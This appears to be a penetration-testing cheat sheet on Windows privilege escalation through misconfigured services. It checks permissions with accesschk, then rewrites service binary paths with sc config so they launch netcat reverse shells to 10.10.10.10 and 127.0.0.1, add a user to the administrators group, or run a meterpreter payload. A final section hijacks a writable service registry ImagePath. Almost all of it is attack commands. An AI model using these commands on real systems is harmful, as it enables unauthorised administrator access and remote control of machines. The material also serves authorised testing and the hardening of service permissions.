# Service Exploit

**DOWNLOAD ACCESSCHK.EXE**
[http://live.sysinternals.com/accesschk.exe](http:/live.sysinternals.com/accesschk.exe)

## Check if User can modify a service

```powershell
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
```

If the group `Authenticated users` has `SERVICE_ALL_ACCESS` in a service, then it can modify the binary that is being executed by the service. 

To modify it and execute netcat you can do:

```powershell
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

## Insecure Service Permissions

```powershell
# Check the permissions on a service
accesschk.exe /accepteula -uwcqv user <SERVICE NAME>
accesschk.exe /accepteula -uwcqv user daclsvc

# Check what the service does
sc qc daclsvc

# Check the status (RUNNING or STOPPED)
sc query daclsvc
```

If you can change config, the easies way to privesc is change BINARY PATH to the location of a reverse shell EXE.

```powershell
# Change the binary path
sc config daclsvc binpath= "\"C:\users\bob\reverse.exe\""
(NOTE THE SPACE after the "=" sign)

Start a netcat listener.

# Start the service or reboot the system
net start daclsvc
shutdown /r
```

## Weak Registry Permissions

```powershell
In WinPEAS shows as:
[?] Check if you can modify the registry of a service
 HKLM\system\currentcontrollerset\services\regsvc

# Check permission using Powershell
powershell -exec bypass

.\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrollerset\services\regsvc
RW NT AUTHORITY\SYSTEM
RW BUILTIN\Administrators
RW NT AUTHORITY\INTERACTIVE

It is executed as ADMINISTRATOR. We can escalate privileges.

# Verify if we can start/stop the service
.\accesschk.exe /accepteula -ucqv user regsvc
SERVICE_START
SERVICE_STOP

# Check the current values in the register
reg query HKLM\system\currentcontrollerset\services\regsvc
Look for ImagePath location and upload a reverse shell to where it is pointing.

# Start the service
net start regsvc
```
